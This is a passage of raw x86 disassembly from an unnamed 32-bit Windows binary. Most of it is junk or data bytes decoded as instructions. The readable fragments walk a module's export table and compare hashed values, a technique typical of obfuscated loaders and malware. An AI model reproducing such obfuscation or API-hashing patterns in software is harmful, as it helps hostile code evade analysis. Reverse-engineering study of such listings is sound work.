  40210b:	jecxz  0x4020aa
  40210d:	arpl   bx,bx
  40210f:	mov    eax,eax
  402111:	fs aad 0x5d
  402114:	xchg   esp,eax
  402115:	or     eax,DWORD PTR [edx-0x10]
  402118:	mov    edi,0x572a6fc9
  40211d:	loope  0x402192
  40211f:	pop    ds
  402120:	ds cwde 
  402122:	loopne 0x4020a7
  402124:	int3   
  402125:	xchg   DWORD PTR [ebp-0x726ed27c],ebx
  40212b:	push   0x30
  40212d:	es hlt 
  40212f:	xchg   edx,eax
  402130:	not    BYTE PTR [esi+0x8]
  402133:	mov    al,0xc9
  402135:	popf   
  402136:	pop    eax
  402137:	ror    DWORD PTR cs:[ebx-0x63],1
  40213b:	pop    edx
  40213c:	sbb    al,0xca
  40213e:	pusha  
  40213f:	push   esp
  402140:	sbb    al,0x48
  402142:	jns    0x40219f
  402144:	lea    ebp,[ebp+ebx*2-0x3c98cc81]
  40214b:	or     DWORD PTR [eax+edi*8-0x205e2608],esi
  402152:	imul   ebx,edi,0x11
  402155:	mov    WORD PTR [ebp+0x4f],fs
  402158:	add    bl,BYTE PTR ds:0x1ab26171
  40215e:	dec    edi
  40215f:	nop
  402160:	jbe    0x4021c2
  402162:	sub    ebx,ecx
  402164:	fs addr16 addr16 or dl,cl
  402169:	xchg   ecx,eax
  40216a:	xor    BYTE PTR [ebx],al
  40216c:	lea    edi,[eax-0x42]
  40216f:	outs   dx,BYTE PTR ds:[esi]
  402170:	adc    DWORD PTR [ebp-0x2d],ecx
  402173:	pop    edi
  402174:	bound  eax,QWORD PTR [ebx]
  402176:	xor    eax,0xaf58c9e9
  40217b:	fwait
  40217c:	pop    edi
  40217d:	out    0xbd,al
  40217f:	mov    eax,ds:0xa9c52ce3
  402184:	call   0x4f8147d1
  402189:	adc    al,0x22
  40218b:	add    bl,BYTE PTR [edx+0x23]
  40218e:	retf   
  40218f:	xchg   DWORD PTR [edx-0x76],esi
  402192:	enter  0xef3e,0xff
  402196:	sub    eax,0xfa9cdc63
  40219b:	jno    0x40218e
  40219d:	mov    WORD PTR [edx+esi*2-0x49],fs
  4021a1:	scas   al,BYTE PTR es:[edi]
  4021a2:	in     al,0xb0
  4021a4:	out    dx,eax
  4021a5:	(bad)  
  4021a6:	adc    eax,0x14453d9d
  4021ab:	pop    eax
  4021ac:	imul   ebx,edx,0x2c
  4021af:	cdq    
  4021b0:	pop    ss
  4021b1:	ins    DWORD PTR es:[edi],dx
  4021b2:	xchg   BYTE PTR [ebx+0x20],dh
  4021b5:	jge    0x402205
  4021b7:	mov    cs,WORD PTR [esi-0xe]
  4021ba:	jge    0x402238
  4021bc:	add    bh,BYTE PTR [ecx+esi*2-0x6aed0867]
  4021c3:	push   cs
  4021c4:	adc    BYTE PTR [edi-0x62],al
  4021c7:	std    
  4021c8:	jge    0x40215e
  4021ca:	aas    
  4021cb:	adc    BYTE PTR [edx+0x77],ah
  4021ce:	mov    ds:0x67d581ef,al
  4021d3:	test   BYTE PTR [ecx],0x25
  4021d6:	les    eax,FWORD PTR [edi+0x7e72ca98]
  4021dc:	jne    0x402163
  4021de:	jle    0x4021dd
  4021e0:	ret    0xb140
  4021e3:	sub    eax,0xc68d4756
  4021e8:	imul   DWORD PTR [edx+0xfcd14df]
  4021ee:	cmp    eax,DWORD PTR [esi]
  4021f0:	push   ebp
  4021f1:	xchg   DWORD PTR [esi+0x1f],edx
  4021f4:	inc    ebx
  4021f5:	or     al,0xe9
  4021f7:	sub    al,0x39
  4021f9:	push   ebp
  4021fa:	cmp    bh,BYTE PTR [esi]
  4021fc:	fidivr DWORD PTR [ebp+0x78116939]
  402202:	in     eax,dx
  402203:	xchg   eax,eax
  402205:	pop    edi
  402206:	mov    ebp,0x5c0e1b61
  40220b:	mov    esi,0xa7ad116b
  402210:	xor    esi,DWORD PTR [ebp-0x55]
  402213:	push   ebx
  402214:	mov    eax,0x57bc2cb3
  402219:	xor    eax,0x2e11e8e6
  40221e:	adc    DWORD PTR [ecx-0x13b08e2c],ecx
  402224:	scas   eax,DWORD PTR es:[edi]
  402225:	adc    esp,DWORD PTR [esi+edx*2-0x57]
  402229:	fisttp QWORD PTR [esi*4+0x1bda2e84]
  402230:	test   eax,0x4e0c3680
  402235:	push   ds
  402236:	(bad)  
  402237:	clc    
  402238:	add    al,0x5f
  40223a:	xor    BYTE PTR [ebp+0x365adfa5],al
  402240:	dec    edx
  402241:	leave  
  402242:	aad    0x41
  402244:	js     0x4021d5
  402246:	xchg   ebp,eax
  402247:	mov    dh,0xf6
  402249:	mov    dh,0x5b
  40224b:	jo     0x4021e0
  40224d:	fs cs push esi
  402250:	inc    ebx
  402251:	in     eax,0x80
  402253:	push   es
  402254:	stos   BYTE PTR es:[edi],al
  402255:	or     DWORD PTR [eax-0x35],esp
  402258:	pop    edx
  402259:	fld    QWORD PTR [edx-0x3b]
  40225c:	(bad)  
  40225d:	mov    ebx,0x69394392
  402262:	cmp    DWORD PTR [edx],edx
  402264:	mov    WORD PTR [ebp-0x4],cx
  402268:	jmp    0x40227a
  40226d:	xor    eax,esi
  40226f:	lea    eax,[eax+ecx*1+0x327299]
  402276:	mov    WORD PTR [ebp-0x4],ax
  40227a:	mov    eax,DWORD PTR [ebp-0xc]
  40227d:	cmp    eax,ebx
  40227f:	je     0x402293
  402285:	mov    eax,DWORD PTR [ebp-0x8]
  402288:	mov    DWORD PTR [eax],0x60341e8e
  40228e:	jmp    0x4028b6
  402293:	mov    eax,DWORD PTR [ebp+0x8]
  402296:	mov    ecx,DWORD PTR [ebp-0x8]
  402299:	xor    eax,esi
  40229b:	add    eax,edi
  40229d:	cmp    DWORD PTR [ecx],eax
  40229f:	je     0x40289e
  4022a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4022a8:	mov    eax,DWORD PTR [ebp-0x8]
  4022ab:	mov    eax,DWORD PTR [eax]
  4022ad:	mov    eax,DWORD PTR [eax+0x3c]
  4022b0:	lea    ecx,[ecx*8+0x78]
  4022b7:	add    eax,ecx
  4022b9:	jmp    0x40248d
  4022be:	je     0x402337
  4022c0:	int3   
  4022c1:	xchg   ecx,eax
  4022c2:	int    0xbd
  4022c4:	jne    0x402339
  4022c6:	jae    0x4022b2
  4022c8:	(bad)  
  4022c9:	minps  xmm4,XMMWORD PTR [eax]
  4022cc:	jmp    0xb57e:0x7e03b6b8
  4022d3:	jg     0x402353
  4022d5:	jle    0x402302
  4022d7:	lods   al,BYTE PTR ss:[esi]
  4022d9:	jmp    0x402328
  4022db:	cld    
  4022dc:	cdq    
  4022dd:	enter  0x84ce,0x9f
  4022e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022e2:	cmp    BYTE PTR gs:[edi+0x7],cl
  4022e6:	pop    ds
  4022e7:	data16 fimul DWORD PTR [ebx]
  4022ea:	jmp    0x2243e033
  4022ef:	sahf   
  4022f0:	cmp    ebx,DWORD PTR [ebx+0x5]
  4022f3:	xchg   edx,eax
  4022f4:	mov    cl,0x5a
  4022f6:	cmp    DWORD PTR [edx],esi
  4022f8:	adc    eax,0xf787c2ee
  4022fd:	mov    ch,0x8
  4022ff:	pop    ss
  402300:	jo     0x4022c5
  402302:	(bad)  
  402303:	fsubr  QWORD PTR [esi+0x3b]
  402306:	or     eax,0xfc39e74
  40230b:	pop    ecx
  40230c:	pop    eax
  40230d:	jns    0x4022cf
  40230f:	mov    esp,0xbff41b4
  402314:	js     0x40236d
  402316:	mov    esp,cs
  402318:	leave  
  402319:	add    eax,0xb32c564d
  40231e:	retf   
  40231f:	hlt    
  402320:	and    BYTE PTR [eax-0x21ee0383],ah
  402326:	cmc    
  402327:	dec    edx
  402328:	sub    al,0x24
  40232a:	and    esp,DWORD PTR [edi*2-0x19e49295]
  402331:	(bad)  
  402333:	(bad)  
  402334:	or     dl,BYTE PTR [edi]
  402336:	adc    dh,dh
  402338:	mov    DWORD PTR [ecx],esi
  40233a:	mov    BYTE PTR [ebp+0x35],cl
  40233d:	lods   al,BYTE PTR ds:[esi]
  40233e:	dec    ecx
  40233f:	mov    edi,0x4f3c5f56
  402344:	test   al,0x53
  402346:	fsub   QWORD PTR [eax+0x7faa978b]
  40234c:	out    dx,eax
  40234d:	mov    cl,BYTE PTR [edx]
  40234f:	xchg   edx,eax
  402350:	cs jecxz 0x40235e
  402353:	jle    0x4022dd
  402355:	inc    esp
  402356:	je     0x4023ab
  402358:	(bad)  
  402359:	loopne 0x402376
  40235b:	adc    ebp,DWORD PTR [edx]
  40235d:	call   0xc3d9:0xc78aca1c
  402364:	push   0x70
  402366:	push   esi
  402367:	jbe    0x402303
  402369:	ret    
  40236a:	sar    BYTE PTR [esp+ebp*8+0x61782d33],1
  402371:	xchg   edx,eax
  402373:	lods   eax,DWORD PTR ds:[esi]
  402374:	adc    esi,edx
  402376:	and    al,0x32
  402378:	out    dx,al
  402379:	or     al,0x63
  40237b:	sub    BYTE PTR [ebp-0x332529af],ch
  402381:	jno    0x4023b6
  402383:	shl    bh,cl
  402385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402386:	jmp    0x402365
  402388:	(bad)  
  402389:	jg     0x402355
  40238b:	mov    edx,0xbacba86
  402390:	arpl   bx,sp
  402392:	sbb    BYTE PTR [edi+0x5a581d1c],ch
  402398:	push   cs
  402399:	ret    
  40239a:	mov    al,ch
  40239c:	sar    BYTE PTR [edi+eiz*2],1
  40239f:	mov    al,BYTE PTR [ecx]
  4023a1:	(bad)  
  4023a3:	adc    eax,0xd6f724e2
  4023a8:	push   esp
  4023a9:	push   0x3a5e3d6c
  4023ae:	and    al,0x73
  4023b0:	add    al,0x35
  4023b2:	in     al,0xf3
  4023b4:	int    0x13
  4023b6:	mov    ecx,0x9a9d5486
  4023bb:	int    0xb6
  4023bd:	cmp    ecx,eax
  4023bf:	das    
  4023c0:	jne    0x40237c
  4023c2:	adc    eax,0xaa7f4ee7
  4023c7:	mov    edx,0x4873d5c5
  4023cc:	and    DWORD PTR ss:[edi+0x70659531],edx
  4023d3:	inc    eax
  4023d4:	mov    esp,0xd5903f17
  4023d9:	mov    dh,BYTE PTR [edx+0x2b]
  4023dc:	loope  0x402412
  4023de:	dec    ebp
  4023df:	(bad)  
  4023e0:	push   eax
  4023e1:	jp     0x4023cc
  4023e3:	rcr    DWORD PTR [edi],1
  4023e5:	pusha  
  4023e6:	xchg   ecx,eax
  4023e7:	cmp    ebx,DWORD PTR [ebx-0x605c6b05]
  4023ed:	add    DWORD PTR [ecx],edx
  4023ef:	retf   0x7005
  4023f2:	ins    BYTE PTR es:[edi],dx
  4023f3:	test   DWORD PTR [esi+0x6e],ebp
  4023f6:	pushf  
  4023f7:	fs ror dl,cl
  4023fa:	js     0x402384
  4023fc:	scas   eax,DWORD PTR es:[edi]
  4023fd:	(bad)  
  4023fe:	dec    ebx
  4023ff:	shl    dl,0x62
  402402:	push   ss
  402403:	push   ebx
  402404:	scas   al,BYTE PTR es:[edi]
  402405:	cmc    
  402406:	dec    esp
  402407:	pop    es
  402408:	ret    0xe2d5
  40240b:	inc    esp
  40240c:	ret    0x79c6
  40240f:	cli    
  402410:	mov    dh,0x77
  402412:	push   eax
  402413:	add    DWORD PTR [esi+0x5cb7ea8c],edx
  402419:	retf   
  40241a:	xor    DWORD PTR [ebp+0x72b2efab],edx
  402420:	out    0x19,eax
  402422:	and    al,0x36
  402424:	jbe    0x402455
  402426:	pop    ebx
  402427:	xor    al,0x8c
  402429:	pop    es
  40242a:	fidiv  DWORD PTR [ecx+ecx*2]
  40242d:	shl    ah,cl
  40242f:	int3   
  402430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402431:	and    al,0xd2
  402433:	mov    ds:0x575d768e,eax
  402438:	inc    eax
  402439:	mov    al,0x3f
  40243b:	mov    esp,0x1dec30e9
  402440:	test   DWORD PTR [esi-0x14],esi
  402443:	mov    bh,0xf6
  402445:	jno    0x402451
  402447:	mov    ?,WORD PTR [esi-0x5df34b38]
  40244d:	in     eax,0xaf
  40244f:	arpl   dx,ax
  402451:	mov    gs:0xea1acd3b,al
  402457:	fstp   TBYTE PTR [ebx-0x1ac672c9]
  40245d:	inc    esp
  40245e:	xchg   esp,eax
  40245f:	mov    ch,0x2b
  402461:	mov    dh,0xc7
  402463:	xor    al,0xd6
  402465:	repz add DWORD PTR [esi-0x5e5f6738],esi
  40246c:	ficomp DWORD PTR [ebx]
  40246e:	fst    QWORD PTR [ecx+0x2ab2a875]
  402474:	ins    BYTE PTR es:[edi],dx
  402475:	sub    BYTE PTR [eax+0x677d3662],bh
  40247b:	xor    al,0x4e
  40247d:	outs   dx,DWORD PTR ds:[esi]
  40247e:	xchg   edi,eax
  40247f:	(bad)  
  402480:	cdq    
  402481:	pop    es
  402482:	out    dx,al
  402483:	jge    0x402494
  402485:	push   cs
  402486:	clc    
  402487:	push   cs
  402488:	test   eax,0x29c2d958
  40248d:	mov    ecx,DWORD PTR [ebp-0x8]
  402490:	mov    ecx,DWORD PTR [ecx]
  402492:	mov    eax,DWORD PTR [eax+ecx*1]
  402495:	mov    DWORD PTR [ebp-0x1c],eax
  402498:	mov    eax,DWORD PTR [ebp+0x8]
  40249b:	xor    eax,esi
  40249d:	add    eax,edi
  40249f:	mov    DWORD PTR [ebp-0x20],eax
  4024a2:	mov    eax,DWORD PTR [ebp+0x8]
  4024a5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024a8:	xor    eax,esi
  4024aa:	add    eax,edi
  4024ac:	cmp    ecx,eax
  4024ae:	je     0x4028b6
  4024b4:	mov    eax,DWORD PTR [ebp-0x8]
  4024b7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024ba:	add    ecx,DWORD PTR [eax]
  4024bc:	jmp    0x402690
  4024c1:	xor    al,0x5a
  4024c3:	inc    edx
  4024c4:	pop    ebp
  4024c5:	pop    esp
  4024c6:	jge    0x4024fd
  4024c8:	arpl   WORD PTR [edx],ax
  4024ca:	outs   dx,BYTE PTR ds:[esi]
  4024cb:	dec    esi
  4024cc:	or     eax,0xd5b9c1bb
  4024d1:	in     eax,dx
  4024d2:	or     eax,0x7fb57e7e
  4024d7:	jle    0x402557
  4024d9:	sbb    DWORD PTR [ebp+0xa5fc5dd],ecx
  4024df:	test   esi,esi
  4024e1:	rcl    BYTE PTR [edx+edx*8+0x189c5ebf],1
  4024e8:	push   cs
  4024e9:	jmp    0x1e5:0x87f94697
  4024f0:	mov    DWORD PTR [ecx-0x55],edx
  4024f3:	leave  
  4024f4:	sub    al,0xb
  4024f6:	jne    0x40256d
  4024f8:	push   edi
  4024f9:	jle    0x402503
  4024fb:	xchg   ecx,eax
  4024fc:	and    al,0x8e
  4024ff:	(bad)  
  402500:	sub    edi,DWORD PTR [eax-0x74]
  402503:	scas   eax,DWORD PTR es:[edi]
  402504:	push   ebx
  402505:	push   0xffffffa8
  402507:	push   eax
  402508:	add    al,0x15
  40250a:	hlt    
  40250b:	jle    0x4024e9
  40250d:	xor    BYTE PTR [edx-0x3dcc655],dl
  402513:	sub    eax,0x4c43a43a
  402518:	sub    edx,DWORD PTR [ecx]
  40251a:	cmp    DWORD PTR [esi],ecx
  40251c:	(bad)  
  40251d:	and    eax,0x6ac02c30
  402522:	jp     0x40259e
  402524:	push   ss
  402525:	addr16 dec esi
  402527:	pop    esp
  402528:	and    eax,0x4b787bbf
  40252d:	mov    ah,0x28
  40252f:	xchg   esp,eax
  402530:	inc    edx
  402531:	add    BYTE PTR [esi-0x1c],dh
  402534:	shl    ebx,0xbe
  402537:	dec    ecx
  402538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402539:	mov    bl,0xcb
  40253b:	mov    ebp,ebx
  40253d:	mov    bl,0x17
  40253f:	sar    BYTE PTR [ecx-0x18b3ccd1],cl
  402545:	imul   ecx,DWORD PTR [ebx+0x6c],0xffffff9c
  402549:	xor    esp,DWORD PTR [eax]
  40254b:	or     eax,0x886b21a8
  402550:	sub    ch,cl
  402552:	sub    DWORD PTR [esi],0xe69cca10
  402558:	xchg   ebp,eax
  402559:	adc    edi,DWORD PTR [ebx+0x2b]
  40255c:	(bad)  
  40255d:	fnstsw WORD PTR [eax-0x45]
  402560:	das    
  402561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402562:	test   eax,0xb73d8d6e
  402567:	pop    ds
  402568:	dec    ecx
  402569:	sti    
  40256a:	jne    0x4024fb
  40256c:	add    ch,al
  40256e:	iret   
  40256f:	sahf   
  402570:	ins    DWORD PTR es:[edi],dx
  402571:	pusha  
  402572:	or     ecx,ebp
  402574:	push   esp
  402575:	xor    al,0x7a
  402577:	dec    esi
  402578:	and    BYTE PTR [eax+edx*2+0x9],dl
  40257c:	jmp    0x4025af
  40257e:	mov    cl,0x12
  402580:	or     DWORD PTR [edx],eax
  402582:	xchg   edx,eax
  402583:	inc    eax
  402584:	sub    eax,0xa5d93655
  402589:	int    0xea
  40258b:	fs xchg edx,eax
  40258d:	ret    
  40258e:	cdq    
  40258f:	jl     0x4025a3
  402591:	sub    BYTE PTR [ebp-0x1b],al
  402594:	pop    ebx
  402595:	sbb    DWORD PTR [esi+0x18],esi
  402598:	in     eax,dx
  402599:	push   es
  40259a:	sbb    edi,ecx
  40259c:	xchg   esi,eax
  40259d:	call   0x93b3:0x20e46009
  4025a4:	cmp    BYTE PTR [edx-0x1d],cl
  4025a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025a8:	clc    
  4025a9:	jmp    0x40261d
  4025ab:	test   al,0x20
  4025ad:	mov    dl,0xd
  4025af:	jb     0x40261c
  4025b1:	sbb    DWORD PTR [ebp+0x35bbe67d],0xe28b6d98
  4025bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025bc:	rcl    BYTE PTR ds:0x1ed30798,0xeb
  4025c3:	mov    dl,BYTE PTR [ebx-0x7e]
  4025c6:	and    DWORD PTR [ecx-0x7a],0x30188dcc
  4025cd:	cmp    BYTE PTR [edi+ebx*1-0x4debd2e4],bh
  4025d4:	aam    0xf1
  4025d6:	(bad)  
  4025d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025d8:	daa    
  4025d9:	pop    ebp
  4025da:	or     al,0x31
  4025dc:	mov    eax,ds:0x17b1a4d5
  4025e1:	or     al,0xd7
  4025e3:	pop    edx
  4025e4:	fcom   DWORD PTR [esi+0x2e3beffa]
  4025ea:	jl     0x4025a2
  4025ec:	cmp    al,0xae
  4025ee:	cmp    DWORD PTR [ebx+0x3],0xb17709ac
  4025f5:	repz fnstsw ax
  4025f8:	mov    esi,0x22a3f499
  4025fd:	jmp    0x402594
  4025ff:	push   eax
  402600:	fcom   QWORD PTR [edi-0x2]
  402603:	cdq    
  402604:	add    ch,BYTE PTR [edx+0x7]
  402607:	stos   BYTE PTR es:[edi],al
  402608:	inc    edi
  402609:	in     eax,dx
  40260a:	div    DWORD PTR [esi+0x9]
  40260d:	mov    dl,0xef
  40260f:	jmp    0xac9f8988
  402614:	repnz lods al,BYTE PTR ds:[esi]
  402616:	push   ds
  402617:	jne    0x40259f
  402619:	dec    ecx
  40261a:	pop    esi
  40261b:	mov    ds:0xe9d52510,al
  402620:	in     al,0x4
  402622:	jecxz  0x402674
  402624:	jle    0x4026a5
  402626:	in     eax,0x4c
  402628:	(bad)  
  402629:	rcl    DWORD PTR [eax+0x1d810d2a],1
  40262f:	jns    0x4025ba
  402631:	test   al,0x7f
  402633:	test   DWORD PTR [ecx+0x5a],0x96ea3096
  40263a:	mov    eax,0x5b13a5d9
  40263f:	imul   ebx,DWORD PTR [edx+0x2c5fc386],0x3d424c65
  402649:	or     dh,BYTE PTR [ebp+0x1b]
  40264c:	mov    al,0xff
  40264e:	inc    eax
  40264f:	xor    ch,BYTE PTR [eax+0x3f]
  402652:	cmp    ch,dh
  402654:	imul   eax,DWORD PTR [ebx+0x2a],0xffffffa5
  402658:	mov    ebp,0xba8ee2d4
  40265d:	mov    cl,0x5
  40265f:	push   ds
  402660:	jg     0x4025e4
  402662:	in     al,0xed
  402664:	inc    esp
  402665:	rcl    BYTE PTR [eax-0x5f],cl
  402668:	dec    eax
  40266a:	pop    edx
  40266b:	adc    edx,DWORD PTR ds:0x982cb2b3
  402671:	and    al,0xa6
  402673:	add    esi,edi
  402675:	or     ecx,ebp
  402677:	test   BYTE PTR [edi-0x64215251],0xc
  40267e:	dec    esi
  40267f:	ret    
  402680:	pop    ebp
  402681:	fisubr WORD PTR [ebx-0x629900fd]
  402687:	cmp    DWORD PTR [eax],eax
  402689:	push   eax
  40268a:	adc    al,0x50
  40268c:	jb     0x402621
  40268e:	sub    bl,cl
  402690:	mov    DWORD PTR [ebp-0x20],ecx
  402693:	mov    eax,DWORD PTR [ebp-0x20]
  402696:	mov    ecx,DWORD PTR [ebp-0x8]
  402699:	mov    eax,DWORD PTR [eax+0xc]
  40269c:	mov    ecx,DWORD PTR [ecx]
  40269e:	mov    al,BYTE PTR [eax+ecx*1]
  4026a1:	add    al,0x3a
  4026a3:	xor    al,0x44
  4026a5:	cmp    al,0xc1
  4026a7:	je     0x402892
  4026ad:	mov    eax,DWORD PTR [ebp+0x8]
  4026b0:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b3:	xor    eax,esi
  4026b5:	add    eax,edi
  4026b7:	jmp    0x40288b
  4026bc:	ins    BYTE PTR es:[edi],dx
  4026bd:	jo     0x4026e5
  4026bf:	arpl   WORD PTR [edx],si
  4026c1:	jge    0x402730
  4026c3:	jno    0x402694
  4026c5:	adc    al,0x86
  4026c7:	mov    dl,0x10
  4026c9:	adc    edx,esi
  4026cb:	mov    bl,0x24
  4026cd:	movd   DWORD PTR [esi-0x4b],mm7
  4026d1:	jg     0x402751
  4026d3:	jle    0x4026f9
  4026d5:	jmp    0x2663:0xa01943f7
  4026dc:	cmp    ch,dl
  4026de:	jecxz  0x4026a8
  4026e0:	inc    ebp
  4026e1:	dec    eax
  4026e2:	les    edx,FWORD PTR [ebx-0x5]
  4026e5:	push   esp
  4026e6:	add    DWORD PTR [edi],esi
  4026e8:	cmp    eax,0xfdc8d00e
  4026ed:	add    DWORD PTR [eax-0x3e],ebx
  4026f0:	cs inc edi
  4026f2:	sub    BYTE PTR [esi-0x5650c37a],ah
  4026f8:	(bad)  
  4026f9:	ror    DWORD PTR [ecx],0x83
  4026fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026fd:	gs loope 0x402697
  402700:	or     eax,0x13f079f1
  402705:	mov    bh,0x8b
  402707:	test   esp,esi
  402709:	pop    edi
  40270a:	and    al,0xd9
  40270c:	push   cs
  40270d:	dec    ecx
  40270e:	pushf  
  40270f:	and    DWORD PTR [eax+esi*4-0x4],ecx
  402713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402714:	lahf   
  402715:	stos   DWORD PTR es:[edi],eax
  402716:	pop    es
  402717:	mov    dl,0xb1
  402719:	or     DWORD PTR [esi],eax
  40271b:	outs   dx,DWORD PTR ds:[esi]
  40271c:	cdq    
  40271d:	scas   eax,DWORD PTR es:[edi]
  40271e:	jo     0x402767
  402720:	sbb    ecx,DWORD PTR [edi]
  402722:	stos   DWORD PTR es:[edi],eax
  402723:	repnz aaa 
  402725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402726:	push   ss
  402727:	or     al,0xd4
  402729:	xchg   esp,eax
  40272a:	push   edi
  40272b:	cld    
  40272c:	stc    
  40272d:	test   DWORD PTR [ecx],esp
  40272f:	into   
  402730:	sub    ah,dl
  402732:	cs sub al,0x60
  402735:	ret    0xe847
  402738:	and    bl,dh
  40273a:	fcom   QWORD PTR [ebp+ebx*2+0xb]
  40273e:	adc    ch,BYTE PTR [eax+0x2c]
  402741:	aam    0xd0
  402743:	(bad)  
  402744:	push   ds
  402745:	and    ebp,ebp
  402747:	jbe    0x40276e
  402749:	adc    BYTE PTR [edi-0x750f5a10],dl
  40274f:	das    
  402750:	mov    DWORD PTR ds:0x3d7d0c2f,ebp
  402756:	sub    DWORD PTR [edi-0x15a1aa7e],0xf9a7dbc2
  402760:	sahf   
  402761:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402762:	sbb    bh,bh
  402764:	adc    al,bl
  402766:	mov    bh,0x50
  402768:	sahf   
  402769:	popf   
  40276a:	imul   edx,DWORD PTR [ecx-0x50],0x2d
  40276e:	ins    BYTE PTR es:[edi],dx
  40276f:	(bad)  
  402770:	gs xchg esi,eax
  402772:	loope  0x402767
  402774:	loopne 0x4026f9
  402776:	mov    ecx,0xc4aadb61
  40277b:	and    ebx,DWORD PTR [eax+0x26]
  40277e:	xor    bh,dh
  402780:	(bad)  
  402781:	mov    ah,0x2b
  402783:	dec    edx
  402784:	sbb    eax,0x9c1640cd
  402789:	xor    ah,BYTE PTR [eax+0x56]
  40278c:	lock je 0x40279d
  40278f:	fmulp  st(4),st
  402791:	push   edx
  402792:	lock test DWORD PTR [ebx+0x4d],ebx
  402796:	test   eax,0x7e2abc5e
  40279b:	xchg   ebp,eax
  40279c:	fwait
  40279d:	push   esi
  40279e:	and    al,0xc
  4027a0:	leave  
  4027a1:	mov    edx,0x4014d4f0
  4027a6:	test   al,0xa8
  4027a8:	imul   ebx,DWORD PTR [edx+0x78],0xb1d42e3c
  4027af:	mov    eax,ds:0xcfa58d37
  4027b4:	sar    DWORD PTR [esi-0x5bdbbc95],0xd5
  4027bb:	shr    DWORD PTR [edi+0x55],0x1a
  4027bf:	jo     0x402776
  4027c1:	rol    DWORD PTR [ebx-0x52],1
  4027c4:	aam    0x90
  4027c6:	ret    
  4027c7:	repnz or BYTE PTR [edi+0x23],0xa3
  4027cc:	adc    dl,al
  4027ce:	add    DWORD PTR [eax],0xffffffa0
  4027d1:	jbe    0x4027ba
  4027d3:	add    eax,0x58183984
  4027d8:	aaa    
  4027d9:	(bad)  
  4027da:	add    edi,DWORD PTR [eax]
  4027dc:	sub    ch,BYTE PTR [edx+0x35]
  4027df:	pop    ds
  4027e0:	xlat   BYTE PTR ds:[ebx]
  4027e1:	sub    eax,0x3948de3
  4027e6:	or     DWORD PTR ds:0xc9ae5373,eax
  4027ec:	(bad)  
  4027ed:	lea    esi,ds:0x960bf261
  4027f3:	ficom  DWORD PTR [ecx+0x8]
  4027f6:	ror    edx,cl
  4027f8:	xchg   ebp,eax
  4027f9:	pop    edx
  4027fa:	rcl    BYTE PTR ds:[ecx-0x1f],0x68
  4027ff:	mov    ecx,0x3d39433a
  402804:	jbe    0x4027db
  402806:	push   ebx
  402807:	call   0x4fc5:0xe94f14c3
  40280e:	scas   eax,DWORD PTR es:[edi]
  40280f:	xchg   edi,eax
  402810:	xchg   edi,ebx
  402812:	add    BYTE PTR es:[ebx-0x2c5f9436],dl
  402819:	pop    eax
  40281a:	pop    ecx
  40281b:	mov    cl,0x2b
  40281d:	popf   
  40281e:	xchg   esi,eax
  40281f:	push   0x4794206
  402824:	nop
  402825:	push   ebp
  402826:	pop    esp
  402827:	aas    
  402828:	mov    ch,0x1
  40282a:	cwde   
  40282b:	sbb    BYTE PTR [ecx],ah
  40282d:	xor    ecx,ebp
  40282f:	fild   DWORD PTR [eax+eiz*4-0xf]
  402833:	mov    esp,esi
  402835:	(bad)  
  402837:	enter  0x3d20,0x89
  40283b:	xor    bl,BYTE PTR [ebx+0xb]
  40283e:	mov    dl,0xac
  402840:	stos   BYTE PTR es:[edi],al
  402841:	adc    bl,BYTE PTR [edx+0x7b]
  402844:	push   esi
  402845:	addr16 push 0x9e4f5fe9
  40284b:	(bad)  
  40284c:	ins    BYTE PTR es:[edi],dx
  40284d:	jb     0x402808
  40284f:	xchg   DWORD PTR [ebx],esi
  402851:	pop    ss
  402852:	mov    ch,0x3a
  402854:	xor    al,ah
  402856:	pop    esi
  402857:	mov    eax,0x1e78bf6f
  40285c:	test   BYTE PTR [ebp-0x50],ch
  40285f:	pop    esp
  402860:	cmp    dh,BYTE PTR ds:0x33b98c2
  402866:	adc    BYTE PTR [esi-0x13],dh
  402869:	mov    cl,0x17
  40286b:	(bad)
  40286e:	mov    edx,0xfab2c161
  402873:	and    eax,0xfb2366bb
  402878:	cmp    eax,DWORD PTR [esi-0x153d17b]
  40287e:	daa    
  40287f:	inc    edi
  402880:	dec    esp
  402881:	cmp    eax,0x21e835a2
  402886:	ins    DWORD PTR es:[edi],dx
  402887:	mov    bh,0xe5
  402889:	dec    esp
  40288a:	mov    al,ds:0x24e90189
  40288f:	add    BYTE PTR [eax],al
  402891:	add    BYTE PTR [ecx-0x2730b8b],al
  402897:	add    eax,0x18e900
  40289c:	add    BYTE PTR [eax],al
  40289e:	mov    eax,DWORD PTR [ebp-0x8]
  4028a1:	mov    ecx,DWORD PTR [ebp-0x18]
  4028a4:	mov    ecx,DWORD PTR [ecx]
  4028a6:	mov    DWORD PTR [eax],ecx
  4028a8:	mov    eax,DWORD PTR [ebp+0xc]
  4028ab:	mov    eax,DWORD PTR [ebp+0x8]
  4028ae:	push   DWORD PTR [ebp-0x8]
  4028b1:	call   0x405275
  4028b6:	mov    eax,DWORD PTR [ebp-0xc]
  4028b9:	cmp    eax,ebx
  4028bb:	je     0x4015da
  4028c1:	mov    eax,DWORD PTR [ebp-0x8]
  4028c4:	mov    eax,DWORD PTR [eax]
  4028c6:	pop    edi
  4028c7:	pop    esi
  4028c8:	pop    ebx
  4028c9:	leave  
  4028ca:	ret    0xc
  4028cd:	push   ebp
  4028ce:	mov    ebp,esp
  4028d0:	sub    esp,0x18
  4028d3:	leave  
  4028d4:	ret    0x8
  4028d7:	push   ebp
  4028d8:	mov    ebp,esp
  4028da:	jmp    0x402a17
  4028df:	sbb    eax,0xb1fd9f1a
  4028e4:	jge    0x402943
